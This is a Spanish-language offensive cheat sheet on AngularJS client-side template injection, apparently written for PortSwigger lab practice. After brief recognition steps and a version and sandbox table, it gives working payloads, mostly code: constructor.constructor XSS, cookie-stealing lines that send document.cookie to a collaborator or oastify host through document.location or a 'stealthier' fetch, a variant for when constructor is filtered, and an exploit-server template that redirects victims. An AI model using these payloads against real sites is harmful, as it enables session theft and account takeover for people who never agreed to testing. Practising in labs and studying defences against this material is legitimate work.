CSTI ≠ SSTI. A diferencia de SSTI aquí el motor de plantillas se ejecuta en el navegador de la víctima (AngularJS típicamente), no en el servidor. El impacto final casi siempre es XSS

### Reconocimiento — ¿hay Angular en juego?
Busca en el HTML de respuesta (view-source), no en JS externo:

```html
<div ng-app>          <!-- o data-ng-app -->
<div ng-app="myApp">
<div ng-controller="...">
```

Si `ng-app` **no tiene valor** → aplicación Angular "auto-bootstrapped", sin módulo custom → normalmente **sin sandbox extra**, ideal para labs de PortSwigger

Revisa la versión de Angular cargada (`angular.min.js` header o `angular.version` en consola). **Clave para el payload:**

| Versión Angular | Sandbox de expresiones          | Payload necesario            |
| --------------- | ------------------------------- | ---------------------------- |
| ≤ 1.5.x         | Sí (con bypasses conocidos)     | Requiere bypass del sandbox  |
| ≥ 1.6.x         | **No existe** (Google lo quitó) | Payload directo, sin evasión |
## Confirmar CSTI (paso equivalente al `'` en SQLi)

Inyecta en el punto reflejado (parámetro GET, campo de búsqueda, comentario, perfil…):

```javascript
{{7*7}}
```

### Payload de explotación (Angular ≥1.6, sin sandbox)

```javascript
{{constructor.constructor('alert(1)')()}}
```

Robo de cookies (impacto real de XSS)
```javascript
{{constructor.constructor('alert(document.cookie)')()}}
{{constructor.constructor('document.location="https://TU-COLLABORATOR/?c="+document.cookie')()}}
```

Esto por si el  constructore esta siendo filtrado :
```javascript
{{$eval.constructor('document.location="https://TU-ID.oastify.com/?c="+document.cookie')()}}
```

Variante con `fetch` (no rompe la navegación de la víctima, más sigiloso)
```javascript
{{$eval.constructor('fetch("https://TU-ID.oastify.com/?c="+document.cookie)')()}}
```

### Plantilla de exploit server (ejemplo genérico)

```html
<script>
document.location = "https://VICTIMA-LAB/vulnerable-endpoint?input="
  + encodeURIComponent('{{constructor.constructor(\'document.location="https://exploit-XXXX.exploit-server.net/log?c="+document.cookie\')()}}');
</script>
```

